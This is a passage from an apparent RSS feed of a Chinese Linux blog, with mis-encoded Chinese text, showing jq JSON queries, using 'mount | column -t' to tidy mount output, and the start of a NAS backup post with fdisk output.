&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                &lt;span class=&#34;s2&#34;&gt;&amp;#34;division&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Engineering&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                &lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Laura&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                &lt;span class=&#34;s2&#34;&gt;&amp;#34;division&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;HR&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                &lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Elise&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                &lt;span class=&#34;s2&#34;&gt;&amp;#34;division&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Marketing&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹ä¸Šé¢ï¼Œ{}æ‹¬èµ·æ¥çš„æ˜¯å¯¹è±¡ï¼Œå¦‚æœæ˜¯[]æ‹¬èµ·æ¥çš„å°±æ˜¯æ•°ç»„äº†ï¼Œnodejsè¦æ³¨æ„è¿™ä¸€ç‚¹ï¼Œå…¶å®jsonæ˜¯jsçš„Objectçš„å­é›†ã€‚&lt;/p&gt;
&lt;p&gt;è·å–å¯¹è±¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat google.json &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq &lt;span class=&#34;s1&#34;&gt;&amp;#39;.name&amp;#39;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Google&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è·å–åµŒå¥—å¯¹è±¡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat google.json &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq &lt;span class=&#34;s1&#34;&gt;&amp;#39;.location.city&amp;#39;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Mountain View&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è·å–ä¸€ä¸ªæ•°ç»„çš„å€¼ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat google.json &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq &lt;span class=&#34;s1&#34;&gt;&amp;#39;.employees[0].name&amp;#39;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Michael&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è·å–å¯¹è±¡çš„å¤šä¸ªå­—æ®µï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat google.json &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq &lt;span class=&#34;s1&#34;&gt;&amp;#39;.location | {street, city}&amp;#39;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;city&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mountain View&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;street&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1600 Amphitheatre Parkway&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¾ˆç®€å•å§ï¼Œå’Œcurlç»“åˆèµ·æ¥ï¼Œå°±å¯ä»¥åœ¨shellè¿›è¡Œç¼–ç¨‹å¤„ç†jsonæ–‡ä»¶äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>linuä¸‹å¦‚ä½•è®©mountæ˜¾ç¤ºçš„å¾ˆæ•´é½</title>
      <link>https://rendoumi.com/posts/20240119-mount_beauty/</link>
      <pubDate>Fri, 19 Jan 2024 10:12:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-mount_beauty/</guid>
      <description>&lt;p&gt;å¦‚æœå•ç‹¬æ‰§è¡Œmountå‘½ä»¤ï¼Œæ˜¾ç¤ºçš„ä¼šå¾ˆæ‚ä¹±ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda3 on / &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; ext4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;proc on /proc &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; proc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sysfs on /sys &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; sysfs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;devpts on /dev/pts &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; devpts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw,gid&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5,mode&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;620&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tmpfs on /dev/shm &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; tmpfs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda1 on /boot &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; ext4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;none on /proc/sys/fs/binfmt_misc &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; binfmt_misc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sunrpc on /var/lib/nfs/rpc_pipefs &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; rpc_pipefs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;You have mail in /var/spool/mail/root  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¹±ä½œä¸€å›¢ï¼Œé‚£ä¹ˆæ€ä¹ˆè®©è¿™äº›æ˜¾ç¤ºæ•´é½ä¸€äº›å‘¢ï¼Ÿ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mount &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;column -t  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda3  on  /                         &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;  ext4         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;proc       on  /proc                     &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;  proc         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sysfs      on  /sys                      &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;  sysfs        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;devpts     on  /dev/pts                  &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;  devpts       &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw,gid&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5,mode&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;620&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tmpfs      on  /dev/shm                  &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;  tmpfs        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda1  on  /boot                     &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;  ext4         &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;none       on  /proc/sys/fs/binfmt_misc  &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;  binfmt_misc  &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sunrpc     on  /var/lib/nfs/rpc_pipefs   &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;  rpc_pipefs   &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;rw&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ•´é½å¤šäº†ï¼Œå¯¹å§ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç¾¤æ™–(é»‘ç¾¤æ™–)çš„å¤‡ä»½</title>
      <link>https://rendoumi.com/posts/20240119-qunhui_backup/</link>
      <pubDate>Fri, 19 Jan 2024 10:11:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240119-qunhui_backup/</guid>
      <description>&lt;p&gt;æ•°æ®å¾ˆé‡è¦ã€æ•°æ®å¾ˆé‡è¦ã€æ•°æ®å¾ˆé‡è¦ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;é‡è¦çš„è¯è¯´ä¸‰éï¼Œè¯è¯´è‡ªå·±ä¹°äº†ä¸ªé»‘ç¾¤æ™–ï¼Œ6ç›˜ä½çš„ï¼Œå°±æ˜¯ä¸ºäº†ä¿å­˜ç…§ç‰‡å’Œæ•°æ®&amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;å…¶å®1ç›˜å’Œ2ç›˜çš„naséƒ½æ˜¯è€æµæ°“ï¼Œæ ¹æœ¬æ— ç”¨ï¼Œå¿…é¡»æ˜¯4ç›˜ä½ä»¥ä¸Šçš„æ‰å‹‰å¼ºå¯é ã€‚æ‰€ä»¥æ‰ä¹°çš„è¿™ä¸ªé»‘ç¾¤æ™–ï¼Œåªä¹°äº†3ä¸ªç›˜åšäº†raid5ï¼Œä¾¥æ˜¯å¦‚æ­¤ï¼ŒçœŸçš„æ˜¯è«ååäº†ä¸€å—ï¼Œå¥½åœ¨åœ¨ä¿ä¿®æœŸå†…ï¼Œæ›´æ¢ä¸€å—åæ•…éšœè§£é™¤ï¼ŒæœŸé—´å€’è…¾2å—ç›˜çš„æ•°æ®ä¾ç„¶æ˜¯å™©æ¢¦å•Šã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ•°æ®å¦‚æ­¤é‡è¦ï¼Œé‚£ä¹ˆæ€ä¹ˆåšåˆ°å®Œå…¨çš„å¤‡ä»½å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;æ•°æ®æ˜¯3ç›˜raid5ï¼Œå·²ç»æœ‰ä¿è¯äº†ï¼Œå‰©ä¸‹å°±æ˜¯ç³»ç»Ÿä¹Ÿå¿…é¡»æœ‰å¤‡ä»½å¯æ¢å¤æ‰å¯ä»¥&lt;/p&gt;
&lt;p&gt;ç¾¤æ™–æœ¬è´¨æ˜¯linuxï¼Œæ–‡ä»¶ç³»ç»Ÿæ˜¯mdadm+lvmï¼Œæ‰€ä»¥å¤‡ä»½ä¹Ÿå¿…é¡»ä»è¿™ä¸ªæ–¹å‘å¼€å§‹ã€‚&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæ˜¯å¤‡ä»½å¯åŠ¨çš„usbç›˜ï¼Œå…ˆfdisk -l çœ‹ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disk /dev/sda: 2000.3 GB, &lt;span class=&#34;m&#34;&gt;2000398934016&lt;/span&gt; bytes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;255&lt;/span&gt; heads, &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; sectors/track, &lt;span class=&#34;m&#34;&gt;243201&lt;/span&gt; cylinders  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Units&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cylinders of &lt;span class=&#34;m&#34;&gt;16065&lt;/span&gt; * &lt;span class=&#34;nv&#34;&gt;512&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;8225280&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Device Boot      Start         End      Blocks  Id System
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda1               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;311&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;2490240&lt;/span&gt;  fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Partition &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; does not end on cylinder boundary  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda2             &lt;span class=&#34;m&#34;&gt;311&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;572&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;2097152&lt;/span&gt;  fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Partition &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; does not end on cylinder boundary  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sda3             &lt;span class=&#34;m&#34;&gt;588&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;243201&lt;/span&gt;  1948793440+ fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disk /dev/sdb: 2000.3 GB, &lt;span class=&#34;m&#34;&gt;2000398934016&lt;/span&gt; bytes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;255&lt;/span&gt; heads, &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; sectors/track, &lt;span class=&#34;m&#34;&gt;243201&lt;/span&gt; cylinders  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Units&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cylinders of &lt;span class=&#34;m&#34;&gt;16065&lt;/span&gt; * &lt;span class=&#34;nv&#34;&gt;512&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;8225280&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Device Boot      Start         End      Blocks  Id System
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sdb1               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;311&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;2490240&lt;/span&gt;  fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Partition &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; does not end on cylinder boundary  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sdb2             &lt;span class=&#34;m&#34;&gt;311&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;572&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;2097152&lt;/span&gt;  fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Partition &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; does not end on cylinder boundary  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sdb3             &lt;span class=&#34;m&#34;&gt;588&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;243201&lt;/span&gt;  1948793440+ fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disk /dev/sdc: 2000.3 GB, &lt;span class=&#34;m&#34;&gt;2000398934016&lt;/span&gt; bytes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;255&lt;/span&gt; heads, &lt;span class=&#34;m&#34;&gt;63&lt;/span&gt; sectors/track, &lt;span class=&#34;m&#34;&gt;243201&lt;/span&gt; cylinders  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Units&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cylinders of &lt;span class=&#34;m&#34;&gt;16065&lt;/span&gt; * &lt;span class=&#34;nv&#34;&gt;512&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;8225280&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Device Boot      Start         End      Blocks  Id System
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sdc1               &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;311&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;2490240&lt;/span&gt;  fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Partition &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; does not end on cylinder boundary  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sdc2             &lt;span class=&#34;m&#34;&gt;311&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;572&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;2097152&lt;/span&gt;  fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Partition &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; does not end on cylinder boundary  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sdc3             &lt;span class=&#34;m&#34;&gt;588&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;243201&lt;/span&gt;  1948793440+ fd Linux raid autodetect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Disk /dev/sdu: &lt;span class=&#34;m&#34;&gt;4227&lt;/span&gt; MB, &lt;span class=&#34;m&#34;&gt;4227858432&lt;/span&gt; bytes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; heads, &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; sectors/track, &lt;span class=&#34;m&#34;&gt;64512&lt;/span&gt; cylinders  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Units&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cylinders of &lt;span class=&#34;m&#34;&gt;128&lt;/span&gt; * &lt;span class=&#34;nv&#34;&gt;512&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; bytes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   Device Boot      Start         End      Blocks  Id System
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/dev/sdu1   *           &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;       16352+  e Win95 FAT16 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;LBA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
